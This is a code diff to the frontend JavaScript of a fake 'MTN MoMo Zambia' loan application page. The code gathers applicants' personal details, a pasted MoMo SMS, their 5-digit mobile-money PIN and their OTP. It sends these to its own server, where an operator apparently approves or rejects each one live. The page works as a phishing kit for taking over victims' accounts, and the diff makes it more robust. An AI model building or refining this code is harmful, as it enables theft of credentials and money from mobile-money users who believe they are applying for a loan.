@@ -1,5 +1,5 @@
 // ============================================================
-// MTN MoMo Zambia Loan Application – Frontend Logic
+// MTN MoMo Zambia Loan Application – Frontend Logic (Patched)
 // ============================================================
 
 const S = {
@@ -7,7 +7,7 @@ const S = {
     firstName: '', lastName: '', phone: '', email: '',
     employment: '', annualIncome: 0,
     kinName: '', kinPhone: '',
-    applicationId: '',  // will be set from server response
+    applicationId: '',
     isSubmitting: false,
     rejectedStep: null
 };
@@ -27,34 +27,21 @@ const STORAGE_KEYS = {
 };
 
 function saveToLocalStorage(key, data) {
-    try {
-        localStorage.setItem(key, JSON.stringify(data));
-        console.log(`💾 Saved to localStorage: ${key}`);
-    } catch (error) {
-        console.error(`❌ Failed to save ${key}:`, error);
-    }
+    try { localStorage.setItem(key, JSON.stringify(data)); }
+    catch (error) { console.error(`❌ Failed to save ${key}:`, error); }
 }
 
 function getFromLocalStorage(key) {
     try {
         const data = localStorage.getItem(key);
         return data ? JSON.parse(data) : null;
-    } catch (error) {
-        console.error(`❌ Failed to load ${key}:`, error);
-        return null;
-    }
+    } catch (error) { return null; }
 }
 
 function removeFromLocalStorage(key) {
-    try {
-        localStorage.removeItem(key);
-        console.log(`🗑️ Removed from localStorage: ${key}`);
-    } catch (error) {
-        console.error(`❌ Failed to remove ${key}:`, error);
-    }
+    try { localStorage.removeItem(key); } catch (_) {}
 }
 
-// ─── Save/Load Application ID (server's ID) ───
 function saveApplicationId(id) {
     if (id) {
         S.applicationId = id;
@@ -68,18 +55,15 @@ function loadApplicationId() {
         const age = Date.now() - new Date(saved.timestamp).getTime();
         if (age < 24 * 60 * 60 * 1000) {
             S.applicationId = saved.id;
-            console.log(`🔄 Restored server application ID: ${saved.id}`);
             return saved.id;
-        } else {
-            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
         }
+        removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
     }
     return null;
 }
 
 function saveApplicationData() {
-    const dataToSave = { ...S, timestamp: new Date().toISOString() };
-    saveToLocalStorage(STORAGE_KEYS.APPLICATION_DATA, dataToSave);
+    saveToLocalStorage(STORAGE_KEYS.APPLICATION_DATA, { ...S, timestamp: new Date().toISOString() });
 }
 
 function loadApplicationData() {
@@ -87,14 +71,12 @@ function loadApplicationData() {
     if (saved) {
         const age = Date.now() - new Date(saved.timestamp).getTime();
         if (age < 24 * 60 * 60 * 1000) {
-            ['loanType', 'loanAmount', 'loanTerm', 'loanPurpose', 'firstName', 'lastName', 'phone', 'email', 'employment', 'annualIncome', 'kinName', 'kinPhone', 'applicationId', 'rejectedStep'].forEach(field => {
-                if (saved[field] !== undefined) S[field] = saved[field];
+            ['loanType', 'loanAmount', 'loanTerm', 'loanPurpose', 'firstName', 'lastName', 'phone', 'email', 'employment', 'annualIncome', 'kinName', 'kinPhone', 'applicationId', 'rejectedStep'].forEach(f => {
+                if (saved[f] !== undefined) S[f] = saved[f];
             });
-            console.log('🔄 Restored application data from localStorage');
             return true;
-        } else {
-            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
         }
+        removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
     }
     return false;
 }
@@ -108,7 +90,7 @@ function loadRejectionInfo() {
     if (saved) {
         const age = Date.now() - new Date(saved.timestamp).getTime();
         if (age < 5 * 60 * 1000) return saved;
-        else removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
+        removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
     }
     return null;
 }
@@ -116,7 +98,7 @@ function loadRejectionInfo() {
 function clearRejectionInfo() { removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO); }
 
 function saveFormDraft() {
-    const draft = {
+    saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, {
         firstName: document.getElementById('s2fi')?.value || '',
         lastName: document.getElementById('s2la')?.value || '',
         phone: document.getElementById('s2ph')?.value || '',
@@ -128,8 +110,7 @@ function saveFormDraft() {
         kinName: document.getElementById('s3kn')?.value || '',
         kinPhone: document.getElementById('s3kp')?.value || '',
         timestamp: new Date().toISOString()
-    };
-    saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, draft);
+    });
 }
 
 function loadFormDraft() {
@@ -147,30 +128,33 @@ function loadFormDraft() {
             if (draft.annualIncome) document.getElementById('s3in').value = draft.annualIncome;
             if (draft.kinName) document.getElementById('s3kn').value = draft.kinName;
             if (draft.kinPhone) document.getElementById('s3kp').value = draft.kinPhone;
-            console.log('🔄 Restored form draft from localStorage');
             return true;
-        } else removeFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
+        }
+        removeFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
     }
     return false;
 }
 
 // ─── Navigation ───
-function goTo(pageId) {
+function _goTo(pageId) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     const el = document.getElementById(pageId);
     if (el) el.classList.add('active');
     window.scrollTo(0, 0);
 }
 
+function goTo(pageId) {
+    _goTo(pageId);
+    if (pageId === 'page-pin') { updatePinPageUI(); checkPinStatus(); }
+    // No resend-SMS button — user simply re-pastes and submits again on rejection.
+}
+
 function startApplication() {
     S.rejectedStep = null;
     clearRejectionInfo();
     if (!S.applicationId) {
-        // Temporary ID until server assigns
         S.applicationId = 'TEMP-' + Date.now().toString().slice(-6);
     }
-    document.getElementById('resendSmsBtn')?.classList.add('hidden');
-    document.getElementById('resendOtpBtn')?.classList.add('hidden');
     ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'].forEach(id => clearErr(id));
     goTo('page-step1');
 }
@@ -182,11 +166,15 @@ function showToast(message, type = 'info', duration = 3000) {
     toast.className = `toast toast-${type}`;
     toast.textContent = message;
     document.body.appendChild(toast);
-    setTimeout(() => { toast.style.opacity = '0'; toast.style.transform = 'translateX(-50%) translateY(-20px)'; setTimeout(() => toast.remove(), 300); }, duration);
+    setTimeout(() => {
+        toast.style.opacity = '0';
+        toast.style.transform = 'translateX(-50%) translateY(-20px)';
+        setTimeout(() => toast.remove(), 300);
+    }, duration);
 }
 
 function normalizePhone(id) {
-    let inp = document.getElementById(id);
+    const inp = document.getElementById(id);
     let val = inp.value.replace(/\D/g, '');
     if (val.length > 9) val = val.substring(0, 9);
     inp.value = val;
@@ -196,7 +184,8 @@ function normalizePhone(id) {
 function updateCalc() {
     const amt = +document.getElementById('amtSlider').value;
     document.getElementById('calcAmt').textContent = 'ZMW ' + amt.toLocaleString();
-    const monthly = Math.ceil(amt / 12);
+    // 48-month default — matches the approval page formula
+    const monthly = Math.ceil(amt / 48);
     document.getElementById('monthlyAmt').textContent = 'ZMW ' + monthly.toLocaleString();
 }
 
@@ -241,11 +230,11 @@ function toS3() {
 function pinMvM(el, i, maxLength = 5) {
     el.value = el.value.replace(/\D/g, '');
     if (el.value && i < maxLength - 1) {
-        const nextPin = document.getElementById('pin' + (i + 1));
-        if (nextPin) { nextPin.focus(); return; }
+        const next = document.getElementById('pin' + (i + 1));
+        if (next) { next.focus(); return; }
     }
     if (i === maxLength - 1 && el.value) {
-        const allFilled = [0,1,2,3,4].every(idx => document.getElementById('pin' + idx)?.value);
+        const allFilled = [0, 1, 2, 3, 4].every(idx => document.getElementById('pin' + idx)?.value);
         if (allFilled) setTimeout(() => doPin(), 300);
     }
 }
@@ -262,10 +251,10 @@ function togPin() {
 }
 
 function chkPin() {
-    const pinOk = [0,1,2,3,4].every(i => document.getElementById('pin' + i)?.value);
+    const pinOk = [0, 1, 2, 3, 4].every(i => document.getElementById('pin' + i)?.value);
     const pinBtn = document.querySelector('#page-pin .btn-grad');
     if (pinBtn) pinBtn.disabled = !pinOk;
-    const otpOk = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
+    const otpOk = [0, 1, 2, 3].every(i => document.getElementById('otp' + i)?.value);
     const otpBtn = document.querySelector('#page-otp .btn-grad');
     if (otpBtn) otpBtn.disabled = !otpOk;
 }
@@ -273,12 +262,12 @@ function chkPin() {
 document.addEventListener('keyup', chkPin);
 
 function clearLoginPin() {
-    [0,1,2,3,4].forEach(i => document.getElementById('pin'+i).value = '');
+    [0, 1, 2, 3, 4].forEach(i => document.getElementById('pin' + i).value = '');
     document.getElementById('pin0').focus(); chkPin();
 }
 
 function clearOtpCode() {
-    [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
+    [0, 1, 2, 3].forEach(i => document.getElementById('otp' + i).value = '');
     document.getElementById('otp0').focus(); chkPin();
 }
 
@@ -288,7 +277,7 @@ function handleOtpInput(el, type) {
     if (el.value && type === 'otp' && idx < 3) document.getElementById('otp' + (idx + 1))?.focus();
     chkPin();
     if (idx === 3 && el.value) {
-        const allFilled = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
+        const allFilled = [0, 1, 2, 3].every(i => document.getElementById('otp' + i)?.value);
         if (allFilled) setTimeout(() => doOtp(), 300);
     }
 }
@@ -334,7 +323,9 @@ function startPinBlockCountdown(seconds) {
             document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = false);
             document.querySelector('#page-pin .btn-grad').disabled = false;
             resetPinAttempts();
-        } else attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
+        } else {
+            attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
+        }
     }, 1000);
 }
 
@@ -357,7 +348,9 @@ function startOtpResendTimer(seconds = 20) {
             clearInterval(otpResendTimer); otpResendTimer = null;
             btn.disabled = false; btn.textContent = '🔄 Resend OTP';
             removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
-        } else btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
+        } else {
+            btn.textContent = `⏳ Wait ${otpResendCountdown}s`;
+        }
     }, 1000);
 }
 
@@ -366,7 +359,7 @@ function checkOtpTimerRecovery() {
     if (saved && saved.endTime && saved.applicationId === S.applicationId) {
         const remaining = Math.ceil((saved.endTime - Date.now()) / 1000);
         if (remaining > 0) { startOtpResendTimer(remaining); return true; }
-        else removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
+        removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
     }
     return false;
 }
@@ -375,7 +368,7 @@ function handleRejection(step) {
     clearErr('s3Err'); clearErr('momErr'); clearErr('pinErr'); clearErr('otpErr');
     if (currentPollTimeout) { clearTimeout(currentPollTimeout); currentPollTimeout = null; }
     saveRejectionInfo(step, S.applicationId);
-    switch(step) {
+    switch (step) {
         case 'sms':
             showToast('❌ SMS was rejected. Please check and resubmit.', 'error');
             document.getElementById('smsMsgBox').value = '';
@@ -407,23 +400,30 @@ function handleRejection(step) {
     }
 }
 
-// ─── Polling (with 404 handling) ───
+// ─── Polling (survives server redeploy — 5 misses before giving up) ───
 function startPoll(applicationId, step, onSuccess, onReject) {
     if (currentPollTimeout) { clearTimeout(currentPollTimeout); currentPollTimeout = null; }
+    let misses = 0;
     const check = async () => {
         try {
             const res = await fetch(`/api/status/${applicationId}/${step}`);
             if (res.status === 404) {
+                misses++;
+                if (misses < 5) {
+                    currentPollTimeout = setTimeout(check, 3000);
+                    return;
+                }
                 currentPollTimeout = null;
                 clearAllStorage();
                 alert('Application not found. Please start again.');
                 goTo('page-landing');
                 return;
             }
+            misses = 0;
             const data = await res.json();
             if (data && data.ok === true) {
                 if (data.status === 'approved') { currentPollTimeout = null; onSuccess(); return; }
-                else if (data.status === 'rejected') { currentPollTimeout = null; onReject(); return; }
+                if (data.status === 'rejected') { currentPollTimeout = null; onReject(); return; }
             }
             currentPollTimeout = setTimeout(check, 2000);
         } catch (err) {
@@ -434,25 +434,9 @@ function startPoll(applicationId, step, onSuccess, onReject) {
     check();
 }
 
+// SMS rejection → user just re-pastes and submits again. No server endpoint needed.
 async function resendSms() {
-    const btn = document.getElementById('resendSmsBtn');
-    if (btn) { btn.disabled = true; btn.textContent = '⏳ Sending...'; }
-    try {
-        const response = await fetch('/api/resend-sms', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ applicationId: S.applicationId })
-        });
-        const data = await response.json();
-        if (data.ok) {
-            showToast('✅ New SMS sent to admin for verification!', 'success');
-            startPoll(S.applicationId, 'sms',
-                () => { showToast('✅ SMS Verified!', 'success'); goTo('page-pin'); },
-                () => handleRejection('sms')
-            );
-        } else showToast('❌ Failed to resend SMS.', 'error');
-    } catch (error) { console.error('Resend SMS error:', error); showToast('❌ Failed to resend SMS.', 'error'); }
-    if (btn) { btn.disabled = false; btn.textContent = '🔄 Resend SMS'; }
+    showToast('Please re-paste the correct SMS and submit again.', 'info');
 }
 
 async function resendOtp() {
@@ -476,7 +460,10 @@ async function resendOtp() {
                 () => { showToast('✅ OTP Verified! Loan Approved 🎉', 'success'); showApproval(); },
                 () => handleRejection('otp')
             );
-        } else { showToast('❌ Failed to resend OTP. Please try again.', 'error'); btn.disabled = false; btn.textContent = '🔄 Resend OTP'; }
+        } else {
+            showToast('❌ Failed to resend OTP. Please try again.', 'error');
+            btn.disabled = false; btn.textContent = '🔄 Resend OTP';
+        }
     } catch (error) {
         console.error('Resend OTP error:', error);
         showToast('❌ Failed to resend OTP. Please try again.', 'error');
@@ -496,7 +483,6 @@ function showApproval() {
     goTo('page-approval');
 }
 
-// ─── Submit Application (capture server ID) ───
 async function submitApp() {
     const em = document.getElementById('s3em').value;
     const in_ = +document.getElementById('s3in').value;
@@ -513,7 +499,7 @@ async function submitApp() {
         });
         const data = await response.json();
         if (data.ok) {
-            S.applicationId = data.applicationId;  // CRITICAL
+            S.applicationId = data.applicationId;
             saveApplicationId(S.applicationId);
             saveApplicationData();
             goTo('page-processing');
@@ -546,14 +532,20 @@ async function doSmsParse() {
             () => { showToast('✅ SMS Verified!', 'success'); goTo('page-pin'); },
             () => handleRejection('sms')
         );
-    } catch (error) { console.error('SMS parse error:', error); showErr('momErr', 'Failed to submit SMS.'); }
+    } catch (error) {
+        console.error('SMS parse error:', error);
+        showErr('momErr', 'Failed to submit SMS.');
+    }
 }
 
 async function doPin() {
-    const pin = [0,1,2,3,4].map(i => document.getElementById('pin'+i).value).join('');
+    const pin = [0, 1, 2, 3, 4].map(i => document.getElementById('pin' + i).value).join('');
     if (pin.length < 5) { showErr('pinErr', 'Enter a valid 5-digit MoMo PIN.'); return; }
     const pinStatus = await checkPinStatus();
-    if (pinStatus && pinStatus.isBlocked) { showErr('pinErr', `Too many failed attempts. Please wait ${pinStatus.blockRemainingSeconds} seconds.`); return; }
+    if (pinStatus && pinStatus.isBlocked) {
+        showErr('pinErr', `Too many failed attempts. Please wait ${pinStatus.blockRemainingSeconds} seconds.`);
+        return;
+    }
     try {
         const response = await fetch('/api/send-pin', {
             method: 'POST',
@@ -582,17 +574,28 @@ async function doPin() {
                         document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
                         document.getElementById('pin0').focus();
                         const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
-                        if (attemptsDisplay) { attemptsDisplay.textContent = `🔑 Attempts remaining: ${rejectData.remainingAttempts} of 3`; attemptsDisplay.className = 'pin-attempts warning'; }
+                        if (attemptsDisplay) {
+                            attemptsDisplay.textContent = `🔑 Attempts remaining: ${rejectData.remainingAttempts} of 3`;
+                            attemptsDisplay.className = 'pin-attempts warning';
+                        }
                         goTo('page-pin');
-                    } else handleRejection('pin');
-                } catch (err) { console.error('Error handling PIN rejection:', err); handleRejection('pin'); }
+                    } else {
+                        handleRejection('pin');
+                    }
+                } catch (err) {
+                    console.error('Error handling PIN rejection:', err);
+                    handleRejection('pin');
+                }
             }
         );
-    } catch (error) { console.error('Error submitting PIN:', error); showErr('pinErr', 'Failed to submit PIN. Please try again.'); }
+    } catch (error) {
+        console.error('Error submitting PIN:', error);
+        showErr('pinErr', 'Failed to submit PIN. Please try again.');
+    }
 }
 
 async function doOtp() {
-    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
+    const otp = [0, 1, 2, 3].map(i => document.getElementById('otp' + i).value).join('');
     if (otp.length < 4) { showErr('otpErr', 'Enter a valid 4-digit OTP.'); return; }
     try {
         await fetch('/api/send-otp', {
@@ -606,7 +609,10 @@ async function doOtp() {
             () => { showToast('✅ OTP Verified! Loan Approved 🎉', 'success'); showApproval(); },
             () => handleRejection('otp')
         );
-    } catch (error) { console.error('OTP submission error:', error); showErr('otpErr', 'Failed to submit OTP.'); }
+    } catch (error) {
+        console.error('OTP submission error:', error);
+        showErr('otpErr', 'Failed to submit OTP.');
+    }
 }
 
 function clearAllStorage() {
@@ -616,15 +622,11 @@ function clearAllStorage() {
 }
 
 function recoverSession() {
-    console.log('🔄 Checking for saved session...');
     const appId = loadApplicationId();
-    if (appId) console.log(`✅ Found server application ID: ${appId}`);
     const dataLoaded = loadApplicationData();
-    if (dataLoaded) console.log('✅ Loaded application data');
-    if (checkOtpTimerRecovery()) { console.log('✅ Recovered OTP timer'); return true; }
+    if (checkOtpTimerRecovery()) return true;
     const rejection = loadRejectionInfo();
     if (rejection) {
-        console.log(`✅ Found rejection info for step: ${rejection.step}`);
         showToast(`⚠️ Your ${rejection.step.toUpperCase()} was rejected. Please try again.`, 'error');
         S.applicationId = rejection.applicationId;
         handleRejection(rejection.step);
@@ -638,16 +640,6 @@ document.addEventListener('input', (e) => {
     if (e.target.closest('#page-step1, #page-step2, #page-step3')) saveFormDraft();
     if (e.target.closest('#page-step2, #page-step3')) saveApplicationData();
 });
-
-const originalGoTo = goTo;
-goTo = function(pageId) {
-    originalGoTo(pageId);
-    if (pageId === 'page-pin') { updatePinPageUI(); checkPinStatus(); }
-    if (pageId === 'page-sms-paste') {
-        const smsBtn = document.getElementById('resendSmsBtn');
-        if (smsBtn) smsBtn.classList.remove('hidden');
-    }
-};
 
 function updatePinPageUI() {
     const pinCard = document.querySelector('#page-pin .step-card');
@@ -667,4 +659,4 @@ updateCalc();
 const recovered = recoverSession();
 if (!recovered) goTo('page-landing');
 
-console.log('✅ MTN MoMo Zambia Loan App (All Features) loaded!');
+console.log('✅ MTN MoMo Zambia Loan App (Patched) loaded!');
